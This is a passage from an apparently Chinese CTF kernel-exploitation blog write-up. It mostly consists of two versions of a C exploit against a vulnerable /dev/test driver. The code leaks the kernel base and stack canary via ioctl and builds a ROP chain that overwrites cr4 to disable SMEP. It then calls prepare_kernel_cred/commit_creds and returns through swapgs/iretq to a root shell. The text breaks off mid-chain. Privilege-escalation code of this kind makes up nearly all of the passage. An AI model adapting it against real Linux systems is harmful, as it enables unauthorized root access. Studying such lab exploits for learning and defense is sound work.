47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stddef.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"minilib.h"</span><span class="cp">
</span>
<span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mh">0x50</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

<span class="kt">size_t</span> <span class="n">nokaslr_kernel_base</span>          <span class="o">=</span> <span class="mh">0xffffffff81000000</span><span class="p">;</span>
<span class="kt">size_t</span> <span class="n">commit_creds</span>         <span class="o">=</span> <span class="mh">0xffffffff810c5010</span><span class="p">;</span>
<span class="kt">size_t</span> <span class="n">prepare_kernel_cred</span>  <span class="o">=</span> <span class="mh">0xffffffff810c5270</span><span class="p">;</span>


<span class="kt">size_t</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>
<span class="kt">void</span> <span class="nf">save_status</span><span class="p">(){</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"mov user_cs, cs;"</span>
        <span class="s">"mov user_ss, ss;"</span>
        <span class="s">"mov user_sp, rsp;"</span>
        <span class="s">"pushf;"</span>
        <span class="s">"pop user_rflags;"</span>
    <span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[34m</span><span class="se">\033</span><span class="s">[1m[*] Status has been saved.</span><span class="se">\033</span><span class="s">[0m"</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">get_root_shell</span><span class="p">(){</span>
    <span class="kt">int</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>
    <span class="n">hex</span><span class="p">(</span><span class="n">uid</span><span class="p">);</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"-c"</span><span class="p">,</span> <span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
    <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="c1">//chmod("/flag",0777);</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">static</span> <span class="kt">size_t</span> <span class="n">shell_addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">get_root_shell</span> <span class="o">+</span> <span class="mi">4</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">shellcode</span><span class="p">(){</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"xor rdi, rdi;"</span>
        <span class="s">"mov rcx, prepare_kernel_cred;"</span>
        <span class="s">"call rcx;"</span>
        <span class="s">"mov rcx, commit_creds;"</span>
        <span class="s">"call rcx;"</span>
        <span class="c1">// swapgs_restore_regs_and_return_to_usermode -- mov rdi,rsp</span>
    <span class="p">);</span>
    <span class="c1">// restore_flags</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"nop;"</span>
        <span class="s">"nop;"</span>
        <span class="s">"push user_ss;"</span>
        <span class="s">"push user_sp;"</span>
        <span class="s">"push user_rflags;"</span>
        <span class="s">"push user_cs;"</span>
        <span class="s">"push shell_addr;"</span>
        <span class="s">"swapgs;"</span>
        <span class="s">"iretq;"</span>
    <span class="p">);</span>
<span class="p">}</span><span class="kt">size_t</span> <span class="n">sc_addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">shellcode</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>





<span class="n">encrypt_cu</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ptext</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">length</span><span class="p">){</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">length</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">;</span>
        <span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">~</span><span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0xF8</span><span class="p">;</span>
        <span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">5</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="n">decrypt_cu</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ptext</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">length</span><span class="p">){</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">length</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-=</span> <span class="mi">5</span><span class="p">;</span>
        <span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0xF8</span><span class="p">;</span>
        <span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">~</span><span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="mh">0x20</span> <span class="o">*</span> <span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">|</span> <span class="p">(</span><span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>



<span class="kt">void</span> <span class="nf">doMain</span><span class="p">(){</span>
    <span class="n">save_status</span><span class="p">();</span>

    <span class="kt">char</span> <span class="n">procn</span><span class="p">[</span><span class="mh">0x30</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/dev/test"</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">procn</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>

    <span class="kt">size_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>

    <span class="n">strcat</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="s">"NdbTh3Vzwu3aFK4PN9B5Fu9fjauaER74</span><span class="se">\x00</span><span class="s">"</span><span class="p">);</span>
    <span class="c1">//strcat(data, "ABCD");</span>
    <span class="n">encrypt_cu</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>

    <span class="kt">size_t</span> <span class="n">edit</span> <span class="o">=</span> <span class="mh">0xFEEDFACE</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">show</span> <span class="o">=</span> <span class="mh">0xDEADBEEF</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">gift</span> <span class="o">=</span> <span class="mh">0xCAFEBABE</span><span class="p">;</span>

    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">show</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
  
    <span class="n">decrypt_cu</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="n">hexdump</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mh">0x100</span><span class="p">);</span>

    <span class="c1">////size_t kernel_ko_addr = byte_to_long(&amp;data[0x20],8);</span>
    <span class="c1">////size_t kernel_base = byte_to_long(&amp;data[0x60],8) - 0x271105;</span>

    <span class="kt">size_t</span> <span class="n">kernel_ko_addr</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x43</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">kernel_base</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x271105</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">canary</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"kernel_ko_addr  = "</span><span class="p">);</span>
    <span class="n">hex</span><span class="p">(</span><span class="n">kernel_ko_addr</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"kernel_base     = "</span><span class="p">);</span>
    <span class="n">hex</span><span class="p">(</span><span class="n">kernel_base</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"stack_canary    = "</span><span class="p">);</span>
    <span class="n">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">);</span>

    <span class="n">prepare_kernel_cred</span>  <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xcfbe0</span><span class="p">;</span>
    <span class="n">commit_creds</span>         <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xcf720</span><span class="p">;</span>


    <span class="n">memset</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x300</span><span class="p">);</span>
    <span class="n">strcat</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="s">"NdbTh3Vzwu3aFK4PN9B5Fu9fjauaER74</span><span class="se">\x00</span><span class="s">"</span><span class="p">);</span>
    <span class="n">repeat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span><span class="sc">'A'</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x24</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0xffffffff81090c80</span> <span class="o">-</span> <span class="n">nokaslr_kernel_base</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span> <span class="c1">// pop rdi; ret;</span>
    <span class="kt">size_t</span> <span class="n">mov_cr4_rdi</span> <span class="o">=</span> <span class="n">kernel_ko_addr</span> <span class="o">+</span> <span class="mh">0x050</span><span class="p">;</span>
    <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
    <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi</span><span class="p">;</span>
    <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x6f0</span><span class="p">;</span>
    <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">mov_cr4_rdi</span><span class="p">;</span>
    <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">sc_addr</span><span class="p">;</span> <span class="c1">// crush 了</span>


    <span class="n">encrypt_cu</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">);</span>

    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">edit</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>

    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">gift</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>


<span class="p">}</span>

<span class="k">extern</span> <span class="kt">void</span> <span class="nf">_start</span><span class="p">(){</span>
    <span class="n">doMain</span><span class="p">();</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>参考链接</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>https://www.anquanke.com/post/id/244966
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<ul>
  <li>上面的的方法明显不行，就 正常 ROP 吧</li>
</ul>

<p>‍</p>

<p>‍</p>

<h3 id="exploit-1"><span class="me-2">exploit</span><a href="#exploit-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ul>
  <li>
    <p>最终成功提权的exp</p>
  </li>
  <li>
    <p>exp.c</p>
  </li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stddef.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"minilib.h"</span><span class="cp">
</span>
<span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mh">0x50</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

<span class="kt">size_t</span> <span class="n">nokaslr_kernel_base</span>          <span class="o">=</span> <span class="mh">0xffffffff81000000</span><span class="p">;</span>
<span class="kt">size_t</span> <span class="n">commit_creds</span>         <span class="o">=</span> <span class="mh">0xffffffff810c5010</span><span class="p">;</span>
<span class="kt">size_t</span> <span class="n">prepare_kernel_cred</span>  <span class="o">=</span> <span class="mh">0xffffffff810c5270</span><span class="p">;</span>


<span class="kt">size_t</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>
<span class="kt">void</span> <span class="nf">save_status</span><span class="p">(){</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"mov user_cs, cs;"</span>
        <span class="s">"mov user_ss, ss;"</span>
        <span class="s">"mov user_sp, rsp;"</span>
        <span class="s">"pushf;"</span>
        <span class="s">"pop user_rflags;"</span>
    <span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[34m</span><span class="se">\033</span><span class="s">[1m[*] Status has been saved.</span><span class="se">\033</span><span class="s">[0m"</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">get_root_shell</span><span class="p">(){</span>
    <span class="kt">int</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>
    <span class="n">hex</span><span class="p">(</span><span class="n">uid</span><span class="p">);</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"-c"</span><span class="p">,</span> <span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
    <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="c1">//chmod("/flag",0777);</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">static</span> <span class="kt">size_t</span> <span class="n">shell_addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">get_root_shell</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">shellcode</span><span class="p">(){</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"xor rdi, rdi;"</span>
        <span class="s">"mov rcx, prepare_kernel_cred;"</span>
        <span class="s">"call rcx;"</span>
        <span class="s">"mov rcx, commit_creds;"</span>
        <span class="s">"call rcx;"</span>
        <span class="c1">// swapgs_restore_regs_and_return_to_usermode -- mov rdi,rsp</span>
    <span class="p">);</span>
    <span class="c1">// restore_flags</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"nop;"</span>
        <span class="s">"nop;"</span>
        <span class="s">"push user_ss;"</span>
        <span class="s">"push user_sp;"</span>
        <span class="s">"push user_rflags;"</span>
        <span class="s">"push user_cs;"</span>
        <span class="s">"push shell_addr;"</span>
        <span class="s">"swapgs;"</span>
        <span class="s">"iretq;"</span>
    <span class="p">);</span>
<span class="p">}</span><span class="kt">size_t</span> <span class="n">sc_addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">shellcode</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>





<span class="n">encrypt_cu</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ptext</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">length</span><span class="p">){</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">length</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">;</span>
        <span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">~</span><span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0xF8</span><span class="p">;</span>
        <span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">5</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="n">decrypt_cu</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ptext</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">length</span><span class="p">){</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">length</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-=</span> <span class="mi">5</span><span class="p">;</span>
        <span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0xF8</span><span class="p">;</span>
        <span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">~</span><span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="mh">0x20</span> <span class="o">*</span> <span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">|</span> <span class="p">(</span><span class="n">ptext</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>



<span class="kt">void</span> <span class="nf">doMain</span><span class="p">(){</span>
    <span class="n">save_status</span><span class="p">();</span>

    <span class="kt">char</span> <span class="n">procn</span><span class="p">[</span><span class="mh">0x30</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/dev/test"</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">procn</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>

    <span class="kt">size_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>

    <span class="n">strcat</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="s">"NdbTh3Vzwu3aFK4PN9B5Fu9fjauaER74</span><span class="se">\x00</span><span class="s">"</span><span class="p">);</span>
    <span class="c1">//strcat(data, "ABCD");</span>
    <span class="n">encrypt_cu</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>

    <span class="kt">size_t</span> <span class="n">edit</span> <span class="o">=</span> <span class="mh">0xFEEDFACE</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">show</span> <span class="o">=</span> <span class="mh">0xDEADBEEF</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">gift</span> <span class="o">=</span> <span class="mh">0xCAFEBABE</span><span class="p">;</span>

    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">show</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
  
    <span class="n">decrypt_cu</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="n">hexdump</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mh">0x100</span><span class="p">);</span>

    <span class="c1">////size_t kernel_ko_addr = byte_to_long(&amp;data[0x20],8);</span>
    <span class="c1">////size_t kernel_base = byte_to_long(&amp;data[0x60],8) - 0x271105;</span>

    <span class="kt">size_t</span> <span class="n">kernel_ko_addr</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x43</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">kernel_base</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x271105</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">canary</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"kernel_ko_addr  = "</span><span class="p">);</span>
    <span class="n">hex</span><span class="p">(</span><span class="n">kernel_ko_addr</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"kernel_base     = "</span><span class="p">);</span>
    <span class="n">hex</span><span class="p">(</span><span class="n">kernel_base</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"stack_canary    = "</span><span class="p">);</span>
    <span class="n">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">);</span>

    <span class="n">prepare_kernel_cred</span>  <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xcfbe0</span><span class="p">;</span>
    <span class="n">commit_creds</span>         <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xcf720</span><span class="p">;</span>


    <span class="n">memset</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x300</span><span class="p">);</span>
    <span class="n">strcat</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="s">"NdbTh3Vzwu3aFK4PN9B5Fu9fjauaER74</span><span class="se">\x00</span><span class="s">"</span><span class="p">);</span>
    <span class="n">repeat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span><span class="sc">'A'</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x24</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0xffffffff81090c80</span> <span class="o">-</span> <span class="n">nokaslr_kernel_base</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span> <span class="c1">// pop rdi; ret;</span>
    <span class="kt">size_t</span> <span class="n">mov_rdi_rax</span> <span class="o">=</span> <span class="n">kernel_ko_addr</span> <span class="o">+</span> <span class="mh">0x04C</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">mov_cr4_rdi</span> <span class="o">=</span> <span class="n">kernel_ko_addr</span> <span class="o">+</span> <span class="mh">0x050</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">swapgs</span> <span class="o">=</span> <span class="n">kernel_ko_addr</span> <span class="o">+</span> <span class="mh">0x54</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">iretq</span>  <span class="o">=</span> <span class="n">kernel_ko_addr</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">;</span> <span class="c1">//iretq; ret</span>

    <span class="kt">size_t</span> <span class="n">swapgs_restore_regs_and_return_to_usermode</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xc00ff0</span> <span class="o">+</span> <span class="mi">54</span><span class="p">;</span>
    <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
    <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="c1">//data[i++] = pop_rdi; </span>
    <span class="c1">//data[i++] = 0x6f0;</span>
    <span class="c1">//data[i++] = mov_cr4_rdi;</span>
    <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi</span><span class="p">;</span>
    <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
